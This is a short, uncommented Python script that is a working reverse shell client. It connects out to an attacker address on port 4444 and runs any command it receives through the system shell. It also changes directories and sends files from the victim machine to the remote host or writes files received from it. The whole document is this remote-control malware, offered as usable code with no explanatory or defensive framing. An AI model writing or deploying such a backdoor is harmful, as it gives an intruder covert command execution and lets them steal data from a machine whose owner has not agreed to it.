import os
import socket
import subprocess

IP = "[IP PLACEHOLDER]"
PORT = 4444


def upload_file(s, filename):
    file_bytes = s.recv(10000000)
    try:
        if file_bytes.decode() == "ERROR":
            return
    except:
        pass
    with open(filename, "wb") as f:
        f.write(file_bytes)


def download_file(s, filename):
    try:
        size = os.stat(filename).st_size
        if int(size) < 10000000:
            with open(filename, "rb") as f:
                data = f.read()
                s.sendall(data)
        else:
            s.sendall("ERROR".encode())
    except:
        s.sendall("ERROR".encode())


try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, PORT))
    while True:
        command = s.recv(1024).decode()
        if command != "":
            if len(command) >= 2 and command[0:2] == "cd":
                try:
                    os.chdir(command[3:])
                    s.send("[+] Changed Directory Succesfully!".encode())
                except:
                    s.send("[-] Directory Not Found!".encode())
            elif command[:8] == 'download':
                download_file(s, command[9:])
            elif command[:6] == 'upload':
                upload_file(s, command[7:])
            elif command != "quit":
                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = execute.stdout.read() + execute.stderr.read()
                result = result.decode()
                s.send(result.encode())
            else:
                s.close()
                break
        else:
            s.send("Invalid Command".encode())
except ConnectionAbortedError:
    quit()
